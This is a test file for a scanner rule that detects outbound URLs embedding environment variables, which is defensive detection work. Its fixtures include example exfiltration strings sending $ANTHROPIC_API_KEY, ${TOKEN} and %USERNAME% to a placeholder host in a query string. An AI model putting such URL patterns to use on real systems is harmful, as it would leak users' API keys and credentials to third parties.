import { describe, expect, it } from "vitest";
import { matchUrlToken } from "../src/core/matchers/url-token.js";

describe("url-token matcher", () => {
  it("flags an environment variable in a URL", () => {
    const source = "fetch https://c.example/?k=$ANTHROPIC_API_KEY now";
    const matches = matchUrlToken(source);
    expect(matches).toHaveLength(1);
    expect(matches[0]?.detail).toBe(
      "outbound URL contains an environment variable: $ANTHROPIC_API_KEY",
    );
    expect(source.slice(matches[0]?.start, matches[0]?.end)).toBe(
      "https://c.example/?k=$ANTHROPIC_API_KEY",
    );
  });

  it("flags a braced variable in a URL", () => {
    const matches = matchUrlToken("open https://c.example/?d=${TOKEN}");
    expect(matches[0]?.detail).toContain("a braced variable: ${TOKEN}");
  });

  it("flags a Windows-style variable in a URL", () => {
    const matches = matchUrlToken("get https://c.example/?u=%USERNAME%");
    expect(matches[0]?.detail).toContain("an environment variable: %USERNAME%");
  });

  it("does not flag a normal URL", () => {
    expect(matchUrlToken("see https://api.example.com/v1/models?limit=50")).toEqual([]);
  });

  it("does not flag lowercase API path segments like OData", () => {
    // $filter and $metadata are API syntax, not environment variables.
    expect(matchUrlToken("call https://svc.example/odata/$metadata?$filter=x")).toEqual([]);
  });

  it("does not flag a variable outside any URL", () => {
    expect(matchUrlToken("set ${TOKEN} in your shell, then run the tool")).toEqual([]);
  });

  it("does not flag percent-encoding", () => {
    expect(matchUrlToken("open https://example.com/a%20b%2Fc")).toEqual([]);
  });

  it("reports one finding per URL and continues past it", () => {
    const source = "a https://x.example/?k=$KEY b https://y.example/?t=${T} c";
    const matches = matchUrlToken(source);
    expect(matches).toHaveLength(2);
  });
});
